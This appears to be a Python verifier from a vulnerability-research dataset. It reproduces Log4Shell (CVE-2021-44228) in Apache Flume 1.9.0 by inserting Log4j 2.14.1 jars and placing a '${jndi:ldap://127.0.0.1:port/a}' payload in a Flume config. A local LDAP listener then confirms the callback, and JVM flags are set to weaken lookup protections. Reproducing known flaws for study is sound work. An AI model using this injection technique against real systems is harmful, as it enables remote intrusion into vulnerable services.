#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import signal
import shutil
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_flume_1_9_0_v1_log4j_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / "apache-flume-1.9.0-bin.tar.gz"
LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
BASE = ROOT / "samples" / SAMPLE_ID / "evidence"
JAVA8_HOME = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
LDAP_BIND_RESPONSE = bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0])

LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
    "log4j-slf4j-impl-2.14.1.jar": LOG4J_CACHE / "log4j-slf4j-impl-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def start_ldap(case_name, timeout=25):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (BASE / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(LDAP_BIND_RESPONSE)
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"LDAP listener did not start for {case_name}")
    return port_box["port"], received, thread


def inspect_core(jar_path):
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
    return {
        "path": str(jar_path),
        "JndiLookup.class": "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names,
        "JndiManager.class": "org/apache/logging/log4j/core/net/JndiManager.class" in names,
    }


def prep_runtime(case_name):
    run_root = BASE / f"{case_name}-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(run_root)

    dist = run_root / "apache-flume-1.9.0-bin"
    lib = dist / "lib"
    before = sorted(p.name for p in lib.glob("*.jar"))
    removed = []
    for pattern in ("slf4j-log4j12-*.jar", "log4j-1.2*.jar"):
        for jar in lib.glob(pattern):
            removed.append(jar.name)
            jar.unlink()
    copied = {}
    for name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        shutil.copy2(source, lib / name)
        copied[name] = {
            "source": str(source),
            "target": str(lib / name),
            "sha256_source": sha256(source),
            "sha256_target": sha256(lib / name),
            "is_generated_v1_runtime_jar": source.is_relative_to(M2),
        }

    conf = dist / "conf"
    conf.mkdir(exist_ok=True)
    (conf / "log4j2.xml").write_text(
        '<Configuration status="WARN">\n'
        '  <Appenders><Console name="Console" target="SYSTEM_OUT">'
        '<PatternLayout pattern="%d %-5p [%t] %c - %m%n"/>'
        '</Console></Appenders>\n'
        '  <Loggers><Root level="INFO"><AppenderRef ref="Console"/></Root></Loggers>\n'
        '</Configuration>\n',
        encoding="utf-8",
    )
    for script in (dist / "bin").glob("*"):
        script.chmod(script.stat().st_mode | 0o111)
    return dist, {
        "before": before,
        "removed": sorted(removed),
        "copied": copied,
        "after": sorted(p.name for p in lib.glob("*.jar")),
        "log4j2_config": str(conf / "log4j2.xml"),
    }


def write_flume_conf(path, source_type):
    path.write_text(
        "\n".join(
            [
                "a1.sources = r1",
                "a1.sinks = k1",
                "a1.channels = c1",
                f"a1.sources.r1.type = {source_type}",
                "a1.sinks.k1.type = logger",
                "a1.channels.c1.type = memory",
                "a1.sources.r1.channels = c1",
                "a1.sinks.k1.channel = c1",
                "",
            ]
        ),
        encoding="utf-8",
    )


def run_case(case_name, source_type_template, use_payload_port):
    dist, replacement = prep_runtime(case_name)
    port, received, thread = start_ldap(case_name)
    if use_payload_port:
        source_type = "${jndi:ldap://127.0.0.1:%d/a}" % port
    else:
        source_type = source_type_template
    conf_file = BASE / f"{case_name}.conf"
    write_flume_conf(conf_file, source_type)

    out_path = BASE / f"{case_name}-flume.log"
    cmd = [
        str(dist / "bin" / "flume-ng"),
        "agent",
        "--conf",
        str(dist / "conf"),
        "--conf-file",
        str(conf_file),
        "--name",
        "a1",
        "-Dflume.root.logger=INFO,console",
        "-Dlog4j.configurationFile=" + str(dist / "conf" / "log4j2.xml"),
        "-Dlog4j2.formatMsgNoLookups=false",
        "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
    ]
    env = os.environ.copy()
    if JAVA8_HOME.exists():
        env["JAVA_HOME"] = str(JAVA8_HOME)
    env["JAVA_TOOL_OPTIONS"] = ""
    started = time.time()
    proc = subprocess.Popen(
        cmd,
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    timed_out = False
    try:
        output, _ = proc.communicate(timeout=18)
    except subprocess.TimeoutExpired:
        timed_out = True
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        output, _ = proc.communicate(timeout=5)
    thread.join(3)
    out_path.write_text(output, encoding="utf-8")
    return {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "runtime": str(dist),
        "conf_file": str(conf_file),
        "source_type": source_type,
        "listener_port": port,
        "listener_received": received,
        "listener_received_count": len(received),
        "returncode": proc.returncode,
        "timed_out": timed_out,
        "replacement": replacement,
        "output_file": str(out_path),
        "output_contains_source_type": source_type in output,
        "output_contains_create_source_log": f"Creating instance of source r1, type {source_type}" in output,
        "output_contains_load_failure": f"Unable to load source type: {source_type}" in output,
        "stdout_tail": output[-8000:],
    }


def main():
    global ROOT, ARCHIVE, LOG4J_CACHE, BASE
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    ARCHIVE = LEGACY_ROOT / "historical-scan" / "apache-flume-1.9.0-bin.tar.gz"
    LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
    BASE = ROOT / "samples" / SAMPLE_ID / "evidence"
    sample_dir = ROOT / "samples" / SAMPLE_ID
    BASE.mkdir(parents=True, exist_ok=True)

    positive = run_case(
        "positive_source_type_jndi",
        "${jndi:ldap://127.0.0.1:%d/a}",
        use_payload_port=True,
    )
    negative = run_case(
        "negative_source_type_control",
        "strict_control_no_jndi_source_type",
        use_payload_port=False,
    )

    core_inspection = inspect_core(LOG4J_CACHE / "log4j-core-2.14.1.jar")
    dep_evidence = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Flume 1.9.0 binary with "
            "log4j-1.2/slf4j-log4j12 binding jars removed, generated v1 Log4j 2.14.1 api/core "
            "jars copied from .m2-poc, and log4j-slf4j-impl copied as the SLF4J bridge into lib "
            "for the verifier run directory"
        ),
        "positive_runtime_replacement": positive["replacement"],
        "negative_runtime_replacement": negative["replacement"],
        "log4j_core": core_inspection,
    }
    (BASE / "dependency-evidence.json").write_text(
        json.dumps(dep_evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )

    confirmed = (
        positive["output_contains_source_type"]
        and positive["output_contains_create_source_log"]
        and positive["output_contains_load_failure"]
        and positive["listener_received_count"] > 0
        and negative["output_contains_source_type"]
        and negative["output_contains_create_source_log"]
        and negative["output_contains_load_failure"]
        and negative["listener_received_count"] == 0
        and "slf4j-log4j12-1.7.25.jar" in positive["replacement"]["removed"]
        and "log4j-1.2.17.jar" in positive["replacement"]["removed"]
        and all(name in positive["replacement"]["copied"] for name in LOG4J_JARS)
        and core_inspection["JndiLookup.class"]
        and core_inspection["JndiManager.class"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/flume",
        "downstream_application": "Apache Flume 1.9.0",
        "downstream_entrypoint": "bin/flume-ng real CLI config loading",
        "downstream": "Apache Flume 1.9.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "insertion_model": dep_evidence["insertion_model"],
        "attack_surface": (
            "Flume CLI `bin/flume-ng agent --conf-file`; user-controlled `a1.sources.r1.type` "
            "value is logged by DefaultSourceFactory during configuration loading through SLF4J/Log4j2"
        ),
        "positive": {
            "returncode": positive["returncode"],
            "timed_out_after_evidence": positive["timed_out"],
            "source_type_logged": positive["output_contains_source_type"],
            "create_source_log": positive["output_contains_create_source_log"],
            "load_failure_logged": positive["output_contains_load_failure"],
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative": {
            "returncode": negative["returncode"],
            "timed_out_after_evidence": negative["timed_out"],
            "control_logged": negative["output_contains_source_type"],
            "create_source_log": negative["output_contains_create_source_log"],
            "load_failure_logged": negative["output_contains_load_failure"],
            "listener_received_count": negative["listener_received_count"],
        },
        "dependency_evidence": dep_evidence,
        "dependency_evidence_file": str(BASE / "dependency-evidence.json"),
        "dynamic_evidence": str(BASE / "probe.json"),
        "run_rc": str(BASE / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_flume_log4j_v1_inserted.py"),
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j api/core 2.14.1 runtime jars into an isolated Flume distribution and triggers Log4Shell through Flume's real CLI config loading path.",
        "cases": [positive, negative],
    }

    (sample_dir / "manifest.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (BASE / "probe.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    listener_hex = ""
    if positive["listener_received"]:
        listener_hex = positive["listener_received"][0].get("data_hex", "")
    (BASE / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_source_type_logged={int(positive['output_contains_source_type'])}\n"
        f"positive_create_source_log={int(positive['output_contains_create_source_log'])}\n"
        f"positive_load_failure_logged={int(positive['output_contains_load_failure'])}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_control_logged={int(negative['output_contains_source_type'])}\n"
        f"negative_create_source_log={int(negative['output_contains_create_source_log'])}\n"
        f"negative_load_failure_logged={int(negative['output_contains_load_failure'])}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"jndi_lookup_class_present={int(core_inspection['JndiLookup.class'])}\n"
        f"jndi_manager_class_present={int(core_inspection['JndiManager.class'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Flume 1.9.0 "
        "binary into an isolated runtime, removes the Log4j 1.x SLF4J binding, and copies Log4j "
        "2.14.1 `api`, `core`, and `slf4j-impl` jars into `lib`.\n\n"
        "The positive run starts `bin/flume-ng agent --conf-file` with a real Flume config whose "
        "`a1.sources.r1.type` value is `${jndi:ldap://127.0.0.1:<port>/a}`. Flume configuration "
        "loading logs `Creating instance of source r1, type ...` and `Unable to load source type: ...` "
        "through SLF4J/Log4j2, and the local LDAP listener receives the Log4j JNDI lookup. The negative "
        "run uses the same invalid source type path with a non-JNDI control string and receives no callback.\n\n"
        "Run: `python3 scripts/verify_flume_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )

    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
